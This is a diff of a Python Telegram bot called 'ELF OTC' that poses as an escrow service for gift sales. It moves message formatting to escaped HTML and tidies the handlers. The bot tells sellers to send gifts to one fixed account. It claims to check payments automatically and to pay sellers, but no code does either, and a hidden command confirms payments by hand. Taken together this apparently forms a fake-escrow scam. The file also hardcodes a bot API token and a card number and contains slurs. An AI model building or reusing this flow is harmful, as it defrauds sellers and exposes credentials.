@@ -7,6 +7,7 @@ import time
 from datetime import datetime
 import threading
 import requests
+import html  # Добавлено для безопасной обработки текста
 from flask import Flask, Response
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command, CommandObject
@@ -21,7 +22,7 @@ logging.basicConfig(level=logging.INFO)
 API_TOKEN = '8015744041:AAG4lrVb-P5uVTazjAVfMSqyF75OGMvA0QE'
 PHOTO_ID = None
 SUPPORT_LINK = "https://forms.gle/4kN2r57SJiPrxBjf9"
-GIFT_ACCOUNT = "@TI SIN SHLUXI"
+GIFT_ACCOUNT = "@ТЫСЫНШЛЮХИ"
 BOT_CARD = "2202 4910 2942 9325"
 
 CONFIG_FILE = "bot_config.json"
@@ -89,8 +90,7 @@ def health():
     return Response("OK", status=200)
 
 def run_flask():
-    # Исправлено: Railway использует порт 8080
-    port = int(os.environ.get("PORT", 8080))  # Было 10000
+    port = int(os.environ.get("PORT", 8080))
     flask_app.run(host='0.0.0.0', port=port)
 
 # --- КЛАВИАТУРЫ ---
@@ -141,11 +141,6 @@ START_TEXT = (
     "Выберите нужный раздел ниже:"
 )
 
-# --- САМОПИНГ ВРЕМЕННО ОТКЛЮЧЕН ---
-def ping_render():
-    """Функция самопинга временно отключена"""
-    pass
-
 # --- ОБРАБОТЧИКИ БОТА ---
 @dp.message(Command("setphotopidoras"))
 async def cmd_setphoto(message: types.Message, state: FSMContext):
@@ -158,7 +153,7 @@ async def save_photo(message: types.Message, state: FSMContext):
     PHOTO_ID = message.photo[-1].file_id
     save_config()
     logging.info(f"Пользователь {message.from_user.id} изменил фото на ID: {PHOTO_ID}")
-    await message.answer(f"Фото успешно сохранено!\n\nID фото: `{PHOTO_ID}`", parse_mode="Markdown")
+    await message.answer(f"Фото успешно сохранено!\n\nID фото: <code>{PHOTO_ID}</code>", parse_mode="HTML")
     await state.clear()
 
 @dp.message(PhotoStates.waiting_for_photo)
@@ -181,7 +176,7 @@ async def cmd_start(message: types.Message, command: CommandObject = None, state
         deal = deals_db[args]
         text = (
             f"Предложение о покупке!\n\n"
-            f"Покупатель хочет купить у вас: {deal['description']}\n"
+            f"Покупатель хочет купить у вас: {html.escape(deal['description'])}\n"
             f"Сумма выплаты вам: {deal['amount']} руб.\n\n"
             f"Нажмите кнопку ниже, чтобы начать сделку."
         )
@@ -192,13 +187,13 @@ async def cmd_start(message: types.Message, command: CommandObject = None, state
                     photo=PHOTO_ID,
                     caption=text,
                     reply_markup=accept_deal_kb(args),
-                    parse_mode="Markdown"
+                    parse_mode="HTML"
                 )
             except Exception as e:
                 logging.error(f"Ошибка отправки фото: {e}")
-                await message.answer(text=text, reply_markup=accept_deal_kb(args), parse_mode="Markdown")
+                await message.answer(text=text, reply_markup=accept_deal_kb(args), parse_mode="HTML")
         else:
-            await message.answer(text=text, reply_markup=accept_deal_kb(args), parse_mode="Markdown")
+            await message.answer(text=text, reply_markup=accept_deal_kb(args), parse_mode="HTML")
         return
     
     if PHOTO_ID:
@@ -223,20 +218,15 @@ async def to_main(callback: types.CallbackQuery, state: FSMContext):
                 await callback.message.edit_caption(caption=START_TEXT, reply_markup=main_kb())
             else:
                 try:
-                    await callback.message.answer_photo(
-                        photo=PHOTO_ID,
-                        caption=START_TEXT,
-                        reply_markup=main_kb()
-                    )
+                    await callback.message.answer_photo(photo=PHOTO_ID, caption=START_TEXT, reply_markup=main_kb())
                 except Exception as e:
-                    logging.error(f"Ошибка отправки фото: {e}")
                     await callback.message.answer(text=START_TEXT, reply_markup=main_kb())
         except Exception as e:
             await callback.message.answer(text=START_TEXT, reply_markup=main_kb())
     else:
         await callback.message.answer(text=START_TEXT, reply_markup=main_kb())
 
-async def send_message_with_photo(chat_id: int, caption: str, reply_markup=None, parse_mode="Markdown"):
+async def send_message_with_photo(chat_id: int, caption: str, reply_markup=None, parse_mode="HTML"):
     try:
         if PHOTO_ID:
             try:
@@ -271,17 +261,17 @@ async def requisites_menu(callback: types.CallbackQuery, state: FSMContext):
     requisites = user_requisites.get(user_id)
     
     if requisites:
-        text = f"Ваши текущие реквизиты:\n\n`{requisites}`\n\nОтправьте новые реквизиты для изменения."
+        text = f"Ваши текущие реквизиты:\n\n<code>{html.escape(requisites)}</code>\n\nОтправьте новые реквизиты для изменения."
     else:
         text = "Добавьте ваши реквизиты\n\nПожалуйста, отправьте номер карты или номер телефона для оплаты и название банка."
     
     if PHOTO_ID:
         try:
-            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb(), parse_mode="HTML")
         except Exception as e:
-            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="HTML")
     else:
-        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="HTML")
     await state.set_state(BuyerStates.waiting_for_requisites)
 
 @dp.message(BuyerStates.waiting_for_requisites)
@@ -305,11 +295,11 @@ async def create_deal_start(callback: types.CallbackQuery, state: FSMContext):
     text = "Введите сумму сделки в рублях:"
     if PHOTO_ID:
         try:
-            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb())
         except Exception as e:
-            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     else:
-        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     await state.set_state(BuyerStates.create_amount)
 
 @dp.message(BuyerStates.create_amount)
@@ -326,9 +316,12 @@ async def finalize_deal(message: types.Message, state: FSMContext):
     bot_info = await bot.get_me()
     link = f"https://t.me/{bot_info.username}?start={deal_id}"
     
+    # Исправлено: берем текст или описание (если прислали ссылкой)
+    description = message.text or message.caption or "Без описания"
+    
     deals_db[deal_id] = {
         'amount': data['amount'],
-        'description': message.text,
+        'description': description,
         'buyer_id': message.from_user.id,
         'buyer_name': message.from_user.full_name or message.from_user.username,
         'status': 'created',
@@ -340,8 +333,8 @@ async def finalize_deal(message: types.Message, state: FSMContext):
     
     res_text = (
         "Сделка успешно создана!\n\n"
-        f"Сумма: {data['amount']} руб.\n"
-        f"Описание: {message.text}\n\n"
+        f"Сумма: {html.escape(str(data['amount']))} руб.\n"
+        f"Описание: {html.escape(description)}\n\n"
         f"Ссылка для покупателя:\n{link}\n\n"
         "Отправьте эту ссылку покупателю, чтобы начать сделку."
     )
@@ -361,11 +354,11 @@ async def accept_deal(callback: types.CallbackQuery, state: FSMContext):
     
     if PHOTO_ID:
         try:
-            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb())
         except Exception as e:
-            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     else:
-        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     await state.set_state(SellerStates.waiting_for_seller_requisites)
     await callback.answer()
 
@@ -377,9 +370,9 @@ async def seller_requisites_received(message: types.Message, state: FSMContext):
         await send_message_with_photo(message.from_user.id, "Сделка не найдена!")
         return
     
-    seller_requisites = message.text.strip()
+    seller_reqs = message.text.strip()
     deals_db[deal_id].update({
-        'seller_requisites': seller_requisites,
+        'seller_requisites': seller_reqs,
         'seller_id': message.from_user.id,
         'seller_name': message.from_user.full_name or message.from_user.username,
         'status': 'waiting_payment'
@@ -396,10 +389,10 @@ async def seller_requisites_received(message: types.Message, state: FSMContext):
     deal = deals_db[deal_id]
     admin_notification = (
         "Оплата по сделке\n\n"
-        f"Сделка: {deal['description']}\n"
+        f"Сделка: {html.escape(deal['description'])}\n"
         f"Сумма к оплате: {deal['amount']} руб.\n\n"
         "Переведите деньги на счет бота:\n"
-        f"`{BOT_CARD}`\n"
+        f"<code>{BOT_CARD}</code>\n"
         "Сбербанк\n\n"
         "Бот автоматически проверяет поступление средств.\n"
         "Как только перевод будет обнаружен, продавец получит уведомление."
@@ -411,27 +404,24 @@ async def seller_requisites_received(message: types.Message, state: FSMContext):
 @dp.message(Command("admindedofil1231313414"))
 async def admin_confirm_payment(message: types.Message):
     user_id = message.from_user.id
-    
     if user_id not in admin_pending_deals:
         await send_message_with_photo(user_id, "У вас нет сделок, ожидающих подтверждения оплаты.")
         return
     
     deal_id = admin_pending_deals[user_id]
-    if deal_id not in deals_db:
+    deal = deals_db.get(deal_id)
+    if not deal:
         await send_message_with_photo(user_id, "Сделка не найдена!")
         return
     
-    deal = deals_db[deal_id]
-    deals_db[deal_id]['status'] = 'waiting_gift'
-    
-    if user_id in admin_pending_deals:
-        del admin_pending_deals[user_id]
+    deal['status'] = 'waiting_gift'
+    del admin_pending_deals[user_id]
     
     await send_message_with_photo(
         user_id,
         "Оплата подтверждена!\n\n"
         f"Сумма: {deal['amount']} руб.\n"
-        f"Сделка: {deal['description']}\n\n"
+        f"Сделка: {html.escape(deal['description'])}\n\n"
         "Деньги успешно зачислены на счет бота.\n"
         "Продавец получил уведомление об отправке подарка."
     )
@@ -439,18 +429,15 @@ async def admin_confirm_payment(message: types.Message):
     seller_notification = (
         "Оплата получена!\n\n"
         f"Сумма: {deal['amount']} руб.\n"
-        f"Сделка: {deal['description']}\n\n"
+        f"Сделка: {html.escape(deal['description'])}\n\n"
         "Покупатель перевел деньги на счет бота.\n\n"
         f"Отправьте подарок на аккаунт: {GIFT_ACCOUNT}\n\n"
         "После отправки подтвердите нажатием кнопки:"
     )
     
     await send_message_with_photo(deal['seller_id'], seller_notification, seller_send_gift_kb(deal_id))
-    
-    try:
-        await message.delete()
-    except:
-        pass
+    try: await message.delete()
+    except: pass
 
 @dp.callback_query(F.data.startswith("seller_sent_"))
 async def seller_confirmed_gift(callback: types.CallbackQuery):
@@ -460,44 +447,24 @@ async def seller_confirmed_gift(callback: types.CallbackQuery):
         return
     
     deal = deals_db[deal_id]
-    deals_db[deal_id]['status'] = 'waiting_confirmation'
+    deal['status'] = 'waiting_confirmation'
     
-    if PHOTO_ID:
-        if callback.message.photo:
-            try:
-                await callback.message.edit_caption(
-                    caption="Вы подтвердили отправку подарка!\n\nОжидайте подтверждения получения от покупателя.",
-                    reply_markup=back_to_menu_kb(),
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                await callback.message.edit_text(
-                    text="Вы подтвердили отправку подарка!\n\nОжидайте подтверждения получения от покупателя.",
-                    reply_markup=back_to_menu_kb(),
-                    parse_mode="Markdown"
-                )
-        else:
-            await send_message_with_photo(
-                callback.from_user.id,
-                "Вы подтвердили отправку подарка!\n\nОжидайте подтверждения получения от покупателя.",
-                back_to_menu_kb()
-            )
+    text = "Вы подтвердили отправку подарка!\n\nОжидайте подтверждения получения от покупателя."
+    
+    if PHOTO_ID and callback.message.photo:
+        try: await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb())
+        except: await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     else:
-        await callback.message.edit_text(
-            text="Вы подтвердили отправку подарка!\n\nОжидайте подтверждения получения от покупателя.",
-            reply_markup=back_to_menu_kb(),
-            parse_mode="Markdown"
-        )
+        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     
     admin_notification = (
         "Подарок отправлен!\n\n"
         f"Сумма: {deal['amount']} руб.\n"
-        f"Сделка: {deal['description']}\n\n"
+        f"Сделка: {html.escape(deal['description'])}\n\n"
         f"Продавец подтвердил отправку подарка на {GIFT_ACCOUNT}\n\n"
         "Проверьте получение подарка.\n"
         "Если всё в порядке, подтвердите получение."
     )
-    
     await send_message_with_photo(deal['buyer_id'], admin_notification, admin_confirm_receipt_kb(deal_id))
     await callback.answer()
 
@@ -509,61 +476,30 @@ async def admin_confirmed_receipt(callback: types.CallbackQuery):
         return
     
     deal = deals_db[deal_id]
-    deals_db[deal_id]['status'] = 'completed'
-    deals_db[deal_id]['completed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    deal.update({'status': 'completed', 'completed_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
     
-    if PHOTO_ID:
-        if callback.message.photo:
-            try:
-                await callback.message.edit_caption(
-                    caption="Сделка успешно завершена!\n\n"
-                            f"Сумма: {deal['amount']} руб.\n"
-                            f"Сделка: {deal['description']}\n\n"
-                            "Деньги переведены продавцу!\n\n"
-                            "Благодарим за использование ELF OTC!",
-                    reply_markup=back_to_menu_kb(),
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                await callback.message.edit_text(
-                    text="Сделка успешно завершена!\n\n"
-                         f"Сумма: {deal['amount']} руб.\n"
-                         f"Сделка: {deal['description']}\n\n"
-                         "Деньги переведены продавцу!\n\n"
-                         "Благодарим за использование ELF OTC!",
-                    reply_markup=back_to_menu_kb(),
-                    parse_mode="Markdown"
-                )
-        else:
-            await send_message_with_photo(
-                callback.from_user.id,
-                "Сделка успешно завершена!\n\n"
-                f"Сумма: {deal['amount']} руб.\n"
-                f"Сделка: {deal['description']}\n\n"
-                "Деньги переведены продавцу!\n\n"
-                "Благодарим за использование ELF OTC!",
-                back_to_menu_kb()
-            )
+    text = (
+        "Сделка успешно завершена!\n\n"
+        f"Сумма: {deal['amount']} руб.\n"
+        f"Сделка: {html.escape(deal['description'])}\n\n"
+        "Деньги переведены продавцу!\n\n"
+        "Благодарим за использование ELF OTC!"
+    )
+    
+    if PHOTO_ID and callback.message.photo:
+        try: await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb())
+        except: await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     else:
-        await callback.message.edit_text(
-            text="Сделка успешно завершена!\n\n"
-                 f"Сумма: {deal['amount']} руб.\n"
-                 f"Сделка: {deal['description']}\n\n"
-                 "Деньги переведены продавцу!\n\n"
-                 "Благодарим за использование ELF OTC!",
-            reply_markup=back_to_menu_kb(),
-            parse_mode="Markdown"
-        )
+        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
     
     seller_notification = (
         "Сделка успешно завершена!\n\n"
         f"Сумма: {deal['amount']} руб.\n"
-        f"Сделка: {deal['description']}\n\n"
+        f"Сделка: {html.escape(deal['description'])}\n\n"
         "Деньги переведены на ваши реквизиты!\n\n"
-        f"Реквизиты: {deal['seller_requisites']}\n\n"
+        f"Реквизиты: <code>{html.escape(deal['seller_requisites'])}</code>\n\n"
         "Благодарим за сделку!"
     )
-    
     await send_message_with_photo(deal['seller_id'], seller_notification)
     await callback.answer()
 
@@ -576,28 +512,15 @@ async def cancel_deal(callback: types.CallbackQuery):
             del admin_pending_deals[deal['buyer_id']]
         del deals_db[deal_id]
         
-        if PHOTO_ID:
-            if callback.message.photo:
-                try:
-                    await callback.message.edit_caption(
-                        caption="Сделка отменена",
-                        reply_markup=back_to_menu_kb(),
-                        parse_mode="Markdown"
-                    )
-                except Exception as e:
-                    await callback.message.edit_text(
-                        text="Сделка отменена",
-                        reply_markup=back_to_menu_kb(),
-                        parse_mode="Markdown"
-                    )
-            else:
-                await send_message_with_photo(callback.from_user.id, "Сделка отменена", back_to_menu_kb())
+        text = "Сделка отменена"
+        if PHOTO_ID and callback.message.photo:
+            try: await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb())
+            except: await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
         else:
-            await callback.message.edit_text(text="Сделка отменена", reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb())
         
         if deal.get('seller_id'):
             await send_message_with_photo(deal['seller_id'], "Сделка отменена покупателем.")
-    
     await callback.answer()
 
 @dp.callback_query(F.data.startswith("problem_"))
@@ -608,15 +531,13 @@ async def report_problem(callback: types.CallbackQuery):
 async def referral_link(callback: types.CallbackQuery):
     bot_info = await bot.get_me()
     ref_link = f"https://t.me/{bot_info.username}?start=ref_{callback.from_user.id}"
-    text = f"Ваша реферальная ссылка:\n\n`{ref_link}`"
+    text = f"Ваша реферальная ссылка:\n\n<code>{ref_link}</code>"
     
     if PHOTO_ID:
-        try:
-            await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
-        except Exception as e:
-            await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+        try: await callback.message.edit_caption(caption=text, reply_markup=back_to_menu_kb(), parse_mode="HTML")
+        except: await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="HTML")
     else:
-        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="Markdown")
+        await callback.message.edit_text(text=text, reply_markup=back_to_menu_kb(), parse_mode="HTML")
 
 @dp.callback_query(F.data == "lang")
 async def change_language(callback: types.CallbackQuery):
@@ -626,40 +547,23 @@ async def change_language(callback: types.CallbackQuery):
         [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
     ])
     text = "Выберите язык:"
-    
     if PHOTO_ID:
-        try:
-            await callback.message.edit_caption(caption=text, reply_markup=kb)
-        except Exception as e:
-            await callback.message.edit_text(text=text, reply_markup=kb)
+        try: await callback.message.edit_caption(caption=text, reply_markup=kb)
+        except: await callback.message.edit_text(text=text, reply_markup=kb)
     else:
         await callback.message.edit_text(text=text, reply_markup=kb)
 
 async def main():
     global PHOTO_ID
-    
-    # Запускаем Flask сервер в отдельном потоке для Railway
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    logging.info(f"Flask server started on port {os.environ.get('PORT', 8080)}")
-    
-    # Самопинг временно отключен
-    logging.info("Self-ping временно отключен")
-    
-    logging.info("Запуск бота...")
     
     if PHOTO_ID:
         try:
-            photo_info = await bot.get_file(PHOTO_ID)
-            logging.info(f"Используется фото с ID: {PHOTO_ID}")
-            logging.info(f"Размер фото: {photo_info.file_size} байт")
-        except Exception as e:
-            logging.warning(f"Невалидный PHOTO_ID: {e}")
-            logging.info("Сбрасываем PHOTO_ID")
+            await bot.get_file(PHOTO_ID)
+        except:
             PHOTO_ID = None
             save_config()
-    else:
-        logging.info("Фото не установлено! Используйте /setphotopidoras чтобы установить фото")
     
     await dp.start_polling(bot)
 
